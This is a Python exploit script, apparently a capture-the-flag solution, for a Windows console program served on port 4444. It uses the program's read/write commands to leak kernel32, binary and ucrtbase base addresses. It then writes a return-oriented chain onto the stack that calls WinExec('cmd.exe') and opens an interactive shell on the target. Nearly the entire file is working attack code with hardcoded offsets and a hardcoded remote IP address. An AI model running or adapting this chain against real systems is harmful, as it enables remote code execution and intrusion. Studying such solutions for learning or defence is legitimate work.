from pwintools import *

DEBUG = False
if DEBUG:
	io = Process([b"AppJailLauncher.exe", b'/nojail', b'/port:4444', b'ConsoleApplication1.exe']) # Spawn chall.exe process
	r = Remote("127.0.0.1", 4444)
	#r.spawn_debugger(breakin=False)
	#log.info("WinExec @ 0x{:x}".format(r.symbols['kernel32.dll']['WinExec']))
else:
	r = Remote("34.79.30.147", 4444)

def leak(off):
	r.recvuntil(b"Do?")
	r.sendline(b"r")
	r.recvuntil(b"pos:")
	r.sendline(str(off).encode())

def write(off, val):
	r.recvuntil(b"Do?")
	r.sendline(b"w")
	r.recvuntil(b"pos:")
	r.sendline(str(off).encode())
	r.recvuntil(b"val:")
	r.sendline(str(val).encode())


'''
approach: call winexec("cmd.exe")

chain:
	pop rcx, ret
	<cmd.exe string in ucrtbase>
	ret (stack alignment)
	winexec
'''

leak(0x10)
kernel32 = int(r.recvline())

print("kernel32 leak ? ", hex(kernel32))

if DEBUG:
	kernel32 -= 0x17614
else:
	kernel32 -= 0x14de0

print("kernel32: ", hex(kernel32))

leak(0x8)
binary =  int(r.recvline())
print("binary: ", hex(binary))

if DEBUG:
	leak(-46)
else:
	leak(-130)
ucrtbase = int(r.recvline())

print("ucrtbase leak ?", hex(ucrtbase))

if DEBUG:
	ucrtbase = ucrtbase - 0xef4e8
else:
	ucrtbase = ucrtbase - 0x78c7

if DEBUG:
	cmd_str = ucrtbase + 0xd0cb0
	ret = kernel32 + 0x1051
	pop_rcx_ret = ucrtbase + 0x2aa80
	winexec = io.symbols['kernel32.dll']['WinExec']
else:
	cmd_str = ucrtbase + 0xdefd0
	pop_rcx_ret = ucrtbase + 0x2ef50
	ret = ucrtbase + 0x1037
	winexec = kernel32 + 0x1280

pop_rdx_ret4 = kernel32 + 0x68812

print("Pop rcx_ret: ", hex(pop_rcx_ret))
print("Pop rdx_ret4: ", hex(pop_rdx_ret4))

print("ucrtbase: ", hex(ucrtbase))
print("cmd.exe string: ", hex(cmd_str))

'''
for i in range(-200, 0):
	leak(i)
	l =  int(r.recvline())
	print("leak: ", hex(l),  i)
'''

# 33 , 34
write(8, pop_rcx_ret)
write(9, cmd_str)
write(10, ret)
write(11, winexec)
write(12, winexec)

r.recvuntil(b"Do?")
r.sendline(b"1")

r.interactive() 

